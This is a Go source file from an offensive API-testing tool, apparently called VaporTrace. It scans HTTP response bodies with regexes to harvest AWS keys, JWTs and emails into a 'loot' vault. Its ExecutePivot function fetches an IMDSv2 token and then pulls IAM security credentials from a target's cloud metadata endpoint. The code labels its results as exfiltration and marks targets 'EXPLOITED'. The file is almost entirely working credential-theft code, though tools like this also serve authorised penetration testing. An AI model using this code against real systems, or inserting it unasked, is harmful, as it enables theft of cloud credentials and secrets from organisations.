/*
Copyright (c) 2026 José María Micoli
Licensed under the Business Source License 1.1
Change Date: 2033-02-17
Change License: Apache-2.0

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

package logic

import (
	"fmt"
	"io"
	"net/http"
	"regexp"
	"sync"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

type Finding struct {
	Type   string
	Value  string
	Source string
}

// LootSummary provides a high-level boolean map for the Strategic Engine
type LootSummary struct {
	HasJWT     bool
	HasAWS     bool
	HasPII     bool
	Credential string // A sample valid credential for use
}

var (
	Vault    []Finding
	vaultMux sync.Mutex

	Patterns = map[string]*regexp.Regexp{
		"AWS_KEY":       regexp.MustCompile(`(AKIA|ASIA)[0-9A-Z]{16,20}`),
		"JWT_TOKEN":     regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
		"EMAIL":         regexp.MustCompile(`[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`),
		"METADATA_IP":   regexp.MustCompile(`127\.0\.0\.1|169\.254\.169\.254`),
		"SENSITIVE_URL": regexp.MustCompile(`http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}`),
	}
)

// GetLootSummary aggregates findings for the Neuro-Engine
func GetLootSummary() LootSummary {
	vaultMux.Lock()
	defer vaultMux.Unlock()

	summary := LootSummary{}
	for _, f := range Vault {
		if f.Type == "JWT_TOKEN" {
			summary.HasJWT = true
			if summary.Credential == "" {
				summary.Credential = f.Value
			}
		}
		if f.Type == "AWS_KEY" || f.Type == "CLOUD_CREDS" {
			summary.HasAWS = true
		}
		if f.Type == "EMAIL" {
			summary.HasPII = true
		}
	}
	// Check Session Overrides
	if CurrentSession.AttackerToken != "" {
		summary.HasJWT = true
		summary.Credential = CurrentSession.AttackerToken
	}
	return summary
}

func ScanForLoot(body string, url string) {
	vaultMux.Lock()
	defer vaultMux.Unlock()

	for label, re := range Patterns {
		matches := re.FindAllString(body, -1)
		for _, m := range matches {
			exists := false
			for _, v := range Vault {
				if v.Value == m && v.Source == url {
					exists = true
					break
				}
			}
			if !exists {
				finding := Finding{
					Type:   label,
					Value:  m,
					Source: url,
				}
				Vault = append(Vault, finding)

				utils.LogLoot(label, m, url)
				// Log to TUI instead of pterm to avoid status bar contamination
				utils.TacticalLog(fmt.Sprintf("[yellow]LOOT:[-] [red]%s[-] [yellow]discovered in[-] [cyan]%s[-]", label, url))

				db.LogQueue <- db.Finding{
					Phase:   "PHASE VIII: EXFIL",
					Target:  url,
					Details: fmt.Sprintf("Leaked %s: %s", label, m),
					Status:  "EXPLOITED",
				}
			}
		}
	}
}

func ExecutePivot(target string, source string) {
	utils.TacticalLog("[cyan]PIVOT:[-] Initiating lateral harvest on " + target)

	client := &http.Client{Timeout: 5 * time.Second}

	token := ""
	tokenReq, _ := http.NewRequest("PUT", fmt.Sprintf("http://%s/latest/api/token", target), nil)
	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")

	tokenResp, err := client.Do(tokenReq)
	if err == nil && tokenResp.StatusCode == 200 {
		tBytes, _ := io.ReadAll(tokenResp.Body)
		token = string(tBytes)
		tokenResp.Body.Close()
	}

	credURL := fmt.Sprintf("http://%s/latest/meta-data/iam/security-credentials/", target)
	hReq, _ := http.NewRequest("GET", credURL, nil)
	if token != "" {
		hReq.Header.Set("X-aws-ec2-metadata-token", token)
	}

	hResp, err := client.Do(hReq)
	if err == nil && hResp.StatusCode == 200 {
		body, _ := io.ReadAll(hResp.Body)
		hResp.Body.Close()

		lootContent := string(body)
		// Masked payload logic
		// payload := fmt.Sprintf("PIVOT_HIT | SRC:%s | DATA:%s", source, lootContent)
		// masked := GhostMask([]byte(payload), MasterKey)
		// fmt.Println(masked)

		vaultMux.Lock()
		Vault = append(Vault, Finding{
			Type:   "CLOUD_CREDS",
			Value:  lootContent,
			Source: source,
		})
		vaultMux.Unlock()

		utils.LogLoot("CLOUD_CREDS", lootContent, source)
	}
}
